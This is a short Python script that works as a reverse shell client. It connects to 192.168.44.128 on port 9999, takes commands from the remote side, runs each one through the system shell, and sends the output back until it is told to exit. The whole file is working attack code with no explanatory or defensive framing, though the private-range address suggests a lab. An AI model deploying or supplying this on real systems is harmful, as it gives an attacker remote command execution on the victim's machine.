import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(('192.168.44.128',9999))

while True:
	command = s.recv(4096).decode('utf-8')

	if command == 'exit':
		s.close()
		break

	CMD = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
	s.send(CMD.stdout)
